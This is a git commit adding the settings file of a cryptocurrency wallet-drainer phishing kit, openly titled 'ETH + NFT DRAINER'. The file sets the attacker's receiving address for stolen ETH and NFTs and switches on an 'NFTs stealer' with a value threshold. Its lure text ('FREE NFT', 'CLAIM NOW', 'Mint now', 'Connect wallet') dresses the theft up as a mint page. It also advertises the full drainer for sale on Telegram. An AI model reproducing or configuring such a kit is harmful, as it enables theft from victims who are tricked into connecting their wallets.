ce09d2f706f0d4b724a9f55db28627696b31e6dc
Moon <104867492+0x32Moon@users.noreply.github.com>
2022-06-15 01:32:12 +0200

    ➕Import files

---
+++ settings.js
@@ -0,0 +1,53 @@
+const receiveAddress = "0x4E02375a803462FE27cb489e7C16ade676f13cD8";
+
+const collectionInfo = {
+    name: "TEC DRAINER",
+    socialMedia: {
+        discord: "https://t.me/TecOnSellix",
+        twitter: "https://t.me/TecOnSellix",
+        instagram: "https://t.me/TecOnSellix",
+    },
+}
+
+const indexPageInfo = {
+    backgroundImage: "background.jpg", // relative path to background image (in assets)
+    title: "{name}", // {name} will be replaced with collectionInfo.name
+    underTitle: "ETH + NFT DRAINER",
+}
+
+const claimPageInfo = {
+    title: "FREE NFT", // <br> is a line break
+    shortDescription: "DRAIN NOW RICH PEOPLE.",
+    longDescription: "YOU CAN ALSO BUY FULL ETH DRAINER WITH SIGNATURE AT T.ME/TECONSELLIX. ENJOY DRAINING!",
+
+    claimButtonText: "CLAIM NOW",
+
+    image: "TecOnSellix.jpeg", // relative path to image (in assets)
+    imageRadius: 250, // image radius in px
+}
+
+const drainNftsInfo = {
+    active: true,   // Active (true) or not (false) NFTs stealer.
+    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+}
+
+const customStrings = {
+    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    connectButton: "Connect wallet",
+    transferButton: "Mint now",
+    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
+}
+
+/*
+    = = = = = END OF SETTINGS = = = = =
+*/
+
+//#region Check Configuration
+if (!receiveAddress.startsWith("0x") ||
+    (
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
+    )
+) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+//#endregion
